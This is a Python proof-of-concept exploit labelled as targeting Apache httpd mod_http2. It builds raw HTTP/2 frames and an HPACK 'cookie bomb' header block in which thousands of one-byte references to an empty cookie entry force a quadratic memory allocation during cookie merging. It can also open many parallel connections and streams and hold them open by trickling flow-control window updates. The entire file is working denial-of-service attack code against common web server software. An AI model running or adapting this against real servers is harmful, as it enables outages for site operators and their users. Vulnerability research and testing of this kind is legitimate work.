#!/usr/bin/env python3
import argparse
import socket
import ssl
import struct
import threading
import time
from typing import Iterable, List, Tuple


CLIENT_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

FRAME_HEADERS = 0x1
FRAME_RST_STREAM = 0x3
FRAME_SETTINGS = 0x4
FRAME_PING = 0x6
FRAME_GOAWAY = 0x7
FRAME_WINDOW_UPDATE = 0x8
FRAME_CONTINUATION = 0x9

FLAG_ACK = 0x1
FLAG_END_STREAM = 0x1
FLAG_END_HEADERS = 0x4

SETTINGS_INITIAL_WINDOW_SIZE = 0x4


def h2_frame(frame_type: int, flags: int, stream_id: int, payload: bytes) -> bytes:
    return (
        len(payload).to_bytes(3, "big")
        + bytes([frame_type, flags])
        + struct.pack("!I", stream_id & 0x7FFFFFFF)
        + payload
    )


def hpack_int(value: int, prefix_bits: int, first_byte_prefix: int) -> bytes:
    max_prefix = (1 << prefix_bits) - 1
    if value < max_prefix:
        return bytes([first_byte_prefix | value])

    out = bytearray([first_byte_prefix | max_prefix])
    value -= max_prefix
    while value >= 128:
        out.append((value & 0x7F) | 0x80)
        value >>= 7
    out.append(value)
    return bytes(out)


def hpack_string(data: bytes) -> bytes:
    return hpack_int(len(data), 7, 0x00) + data


def indexed(index: int) -> bytes:
    return hpack_int(index, 7, 0x80)


def literal_indexed_name_with_indexing(name_index: int, value: bytes) -> bytes:
    return hpack_int(name_index, 6, 0x40) + hpack_string(value)


def literal_indexed_name_without_indexing(name_index: int, value: bytes) -> bytes:
    return hpack_int(name_index, 4, 0x00) + hpack_string(value)


def build_httpd_cookie_bomb(authority: str, path: str, refs: int) -> bytes:
    block = bytearray()

    block += indexed(2)  # :method: GET
    block += indexed(7)  # :scheme: https
    block += literal_indexed_name_without_indexing(4, path.encode())  # :path
    block += literal_indexed_name_without_indexing(1, authority.encode())  # :authority

    # HPACK static index 32 is "cookie". An empty cookie value creates a 38-byte
    # dynamic table entry, so it survives as dynamic index 62 for thousands of
    # one-byte indexed references. httpd merges HTTP/2 cookie crumbs with "; ".
    block += literal_indexed_name_with_indexing(32, b"")
    block += indexed(62) * refs
    return bytes(block)


def settings_payload(settings: Iterable[Tuple[int, int]]) -> bytes:
    return b"".join(struct.pack("!HI", key, value) for key, value in settings)


def recv_exact(sock: ssl.SSLSocket, n: int) -> bytes:
    chunks = bytearray()
    while len(chunks) < n:
        chunk = sock.recv(n - len(chunks))
        if not chunk:
            raise EOFError("socket closed")
        chunks += chunk
    return bytes(chunks)


def read_frame(sock: ssl.SSLSocket) -> Tuple[int, int, int, bytes]:
    hdr = recv_exact(sock, 9)
    length = int.from_bytes(hdr[:3], "big")
    frame_type = hdr[3]
    flags = hdr[4]
    stream_id = struct.unpack("!I", hdr[5:9])[0] & 0x7FFFFFFF
    return frame_type, flags, stream_id, recv_exact(sock, length)


def service_peer_frames(sock: ssl.SSLSocket, seconds: float) -> dict:
    counts = {"settings": 0, "ping": 0, "goaway": 0, "rst": 0, "other": 0}
    deadline = time.monotonic() + seconds
    sock.settimeout(0.1)
    while time.monotonic() < deadline:
        try:
            frame_type, flags, _stream_id, payload = read_frame(sock)
        except socket.timeout:
            continue
        except (EOFError, ssl.SSLError, OSError):
            break

        if frame_type == FRAME_SETTINGS and not (flags & FLAG_ACK):
            counts["settings"] += 1
            sock.sendall(h2_frame(FRAME_SETTINGS, FLAG_ACK, 0, b""))
        elif frame_type == FRAME_PING and not (flags & FLAG_ACK):
            counts["ping"] += 1
            sock.sendall(h2_frame(FRAME_PING, FLAG_ACK, 0, payload))
        elif frame_type == FRAME_GOAWAY:
            counts["goaway"] += 1
        elif frame_type == FRAME_RST_STREAM:
            counts["rst"] += 1
        else:
            counts["other"] += 1
    return counts


def send_header_block(sock: ssl.SSLSocket, stream_id: int, block: bytes, max_frame: int = 16384) -> int:
    chunks = [block[i : i + max_frame] for i in range(0, len(block), max_frame)] or [b""]
    sent_frames = 0
    for i, chunk in enumerate(chunks):
        first = i == 0
        last = i == len(chunks) - 1
        frame_type = FRAME_HEADERS if first else FRAME_CONTINUATION
        flags = FLAG_END_STREAM if first else 0
        if last:
            flags |= FLAG_END_HEADERS
        sock.sendall(h2_frame(frame_type, flags, stream_id, chunk))
        sent_frames += 1
    return sent_frames


def connect_h2(host: str, port: int, server_name: str, initial_window: int) -> ssl.SSLSocket:
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.set_alpn_protocols(["h2"])
    raw = socket.create_connection((host, port), timeout=5)
    sock = context.wrap_socket(raw, server_hostname=server_name)
    if sock.selected_alpn_protocol() != "h2":
        raise RuntimeError(f"ALPN failed, got {sock.selected_alpn_protocol()!r}")

    sock.sendall(CLIENT_PREFACE)
    sock.sendall(
        h2_frame(
            FRAME_SETTINGS,
            0,
            0,
            settings_payload([(SETTINGS_INITIAL_WINDOW_SIZE, initial_window)]),
        )
    )
    service_peer_frames(sock, 1.0)
    return sock


def drip_window(sock: ssl.SSLSocket, stream_ids: List[int], amount: int) -> None:
    payload = struct.pack("!I", amount & 0x7FFFFFFF)
    sock.sendall(h2_frame(FRAME_WINDOW_UPDATE, 0, 0, payload))
    for stream_id in stream_ids:
        sock.sendall(h2_frame(FRAME_WINDOW_UPDATE, 0, stream_id, payload))


def run_connection(conn_id: int, args: argparse.Namespace, block: bytes) -> None:
    sock = connect_h2(args.host, args.port, args.server_name, args.initial_window)
    stream_ids = [1 + 2 * i for i in range(args.streams)]
    frames = 0
    started = time.monotonic()
    for stream_id in stream_ids:
        frames += send_header_block(sock, stream_id, block)
    elapsed = time.monotonic() - started
    print(
        f"conn={conn_id} sent_streams={len(stream_ids)} "
        f"header_block={len(block)}B frames={frames} elapsed={elapsed:.3f}s",
        flush=True,
    )

    counts = {"settings": 0, "ping": 0, "goaway": 0, "rst": 0, "other": 0}
    if args.drip_interval > 0:
        stop_at = time.monotonic() + args.hold
        while time.monotonic() < stop_at:
            delta = service_peer_frames(sock, min(args.drip_interval, max(0.0, stop_at - time.monotonic())))
            for key, value in delta.items():
                counts[key] += value
            drip_window(sock, stream_ids, args.drip_bytes)
    elif args.hold > 0:
        counts = service_peer_frames(sock, args.hold)

    print(f"conn={conn_id} peer_frames={counts}", flush=True)
    sock.close()


def main() -> None:
    parser = argparse.ArgumentParser(description="Apache httpd mod_http2 HPACK cookie-crumb coalescing PoC")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=10080)
    parser.add_argument("--server-name", default="localhost")
    parser.add_argument("--path", default="/missing")
    parser.add_argument("--connections", type=int, default=1)
    parser.add_argument("--streams", type=int, default=1)
    parser.add_argument("--refs", type=int, default=4091)
    parser.add_argument("--initial-window", type=int, default=0)
    parser.add_argument("--hold", type=float, default=30.0)
    parser.add_argument("--drip-interval", type=float, default=0.0)
    parser.add_argument("--drip-bytes", type=int, default=1)
    args = parser.parse_args()

    block = build_httpd_cookie_bomb(args.server_name, args.path, args.refs)
    accepted_duplicate_refs = min(args.refs, 4091)
    merge_alloc = accepted_duplicate_refs * (accepted_duplicate_refs + 1) + accepted_duplicate_refs
    final_cookie = accepted_duplicate_refs * 2
    print(
        "payload: "
        f"refs={args.refs} header_block={len(block)}B "
        f"estimated_merge_alloc={merge_alloc / 1048576:.2f}MiB "
        f"final_cookie={final_cookie}B "
        f"per_stream_wire_to_cookie_alloc={merge_alloc / max(1, len(block)):.1f}:1",
        flush=True,
    )

    threads = [
        threading.Thread(target=run_connection, args=(i, args, block), daemon=False)
        for i in range(args.connections)
    ]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()


if __name__ == "__main__":
    main()
